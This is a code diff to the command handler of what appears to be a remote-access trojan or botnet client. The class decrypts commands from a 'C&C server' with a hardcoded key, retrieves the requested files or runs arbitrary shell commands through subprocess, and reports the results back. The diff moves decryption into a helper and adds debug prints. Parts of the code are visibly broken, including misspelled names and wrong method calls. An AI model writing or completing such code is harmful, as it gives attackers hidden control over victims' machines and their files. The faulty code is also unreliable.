@@ -5,6 +5,7 @@ import mimetypes
 # internal imports
 from utils.data_request_type import DataRequestType
 from utils.consts import DATA_CHUNK_SIZE
+from utils.consts import decrypt
 
 class Command:
     """ A class for handling the command sent by the C&C server. """
@@ -12,13 +13,10 @@ class Command:
     def __init__(self, encrypted_command):
         self.cmd = encrypted_command
     
-    def decrypt(self):
-        """ Decrypts the encrypted command into either a shell command or file retrieval command. """
-        pass
-    
     def execute(self):
         """ Executes the command based on the type of command. """
-        decrypted = self.decrypt(self.cmd)
+        decrypted = decrypt(self.cmd, "secret")
+        print("decrypted: " + decrypted)
         
         if decrypted.starts_with("get:"):
             file_path = decrypted[decryped.index(":") + 1:]
@@ -63,6 +61,6 @@ class Command:
             })
         else:
             process = subprocess.call(decrypted.split())
-                
+            print("process " + process)
             request = Request(RequestType.RECEIPT)
             request.send(options={"retcode": process.retcode, "output": process.stderr if process.retcode != 0 else stdout})
